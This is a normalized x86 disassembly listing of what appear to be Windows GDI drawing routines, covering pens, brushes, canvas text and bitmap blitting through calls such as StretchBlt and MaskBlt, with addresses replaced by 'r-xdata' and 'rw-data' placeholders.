mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424640
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_4250c8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424f7c
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_424f94
add esp 0x10
pop esi
pop ebx
retn
sub_4250f8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424f7c
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_424f94
sub_425124
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423e70
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_425164
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42518c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4192f4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424684
xor eax eax
push ebp
push sub_42521c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424684
xor eax eax
push ebp
push sub_4251ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42407c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425206
mov eax [ ebp - 0x8 ]
call sub_424694
retn
sub_425234
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_425250
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424684
xor eax eax
push ebp
push sub_425295
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424004
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42529c
mov eax [ ebp - 0x4 ]
call sub_424694
retn
sub_4252a0
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_425250
add esp 0x10
pop edi
pop esi
retn
sub_4252cc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_425234
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_425250
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_425300
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423e58
xor edx edx
push ebp
push sub_4253cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423e64
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424640
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_4253e8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_425234
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_425250
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_42541c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_42492c
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425d14
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e58
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425d34
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425124
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425d54
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_419034
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4254e0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4190d0
xor edx edx
mov eax esi
call sub_425b4c
mov eax [ esi + 0xc ]
call sub_40331c
mov eax [ esi + 0x10 ]
call sub_40331c
mov eax [ esi + 0x14 ]
call sub_40331c
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42553c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425ba0
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4255c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov eax [ ebx + 0x14 ]
call sub_4252c4
call sub_424640
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41766c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_425670
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov eax [ ebx + 0x14 ]
call sub_425300
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4256ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov eax [ ebx + 0x14 ]
call sub_425300
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4256e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_425748
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_425774
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4257ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4257f4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_425830
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_425acc
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_42585c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov eax ebx
call sub_425830
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4043d8
push eax
mov eax esi
call sub_4045d8
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_42592c
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_425748
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_42592c
inc eax
add edi eax
sub_4258e8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4043d8
push eax
mov eax edi
call sub_4045d8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_42592c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4258e8
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_425948
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4258e8
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_425968
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4259b4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259bb
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_425720
sub_425a14
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_425a38
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_425748
pop ecx
pop edx
pop edi
pop esi
retn
sub_425a58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_425a84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425ba0
mov eax [ ebp + 0x8 ]
call sub_424640
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_425aec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_425b4c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_425aec
mov edx esp
mov eax ebx
call sub_425a14
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_425a38
sub_425ba0
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_425c3c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
test bl 0x8
je r-xdata
mov eax esi
call sub_425c68
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_425c98
sub_425c3c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_424b14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_425c68
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_425014
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_425c98
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_425300
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_425300
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_4253e0
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4252c4
call sub_424640
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4252c4
call sub_424640
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_425dbc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_425e06
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e0d
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_425e10
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_425eac
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_425dbc
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404388
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425eb3
lea eax [ ebp - 0x104 ]
call sub_404118
retn
sub_425ec8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_426016
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425f85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_425e10
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_425e10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42601d
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_426028
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_42605c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425eb8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4262dc
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425eb8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262e3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425eb8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42612f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406e44
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262e3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_4262f0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
